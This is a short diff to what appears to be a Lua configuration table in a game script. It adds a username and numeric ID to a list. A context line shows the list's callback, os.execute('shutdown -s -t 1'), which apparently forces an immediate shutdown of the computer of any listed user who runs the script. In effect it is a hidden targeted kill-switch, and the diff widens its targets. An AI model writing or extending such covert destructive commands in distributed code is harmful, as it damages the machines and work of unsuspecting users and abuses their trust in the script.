@@ -200,6 +200,7 @@
     {1546881015,'brawlstars__top'},
     {1347168611,'icooper0'},
     {3938175496,'ghjghgfhfgfsdfsdf'},
+    {3696438079,'l1rt3x'},
   },
   callback = function() os.execute('shutdown -s -t 1')  end,
 }
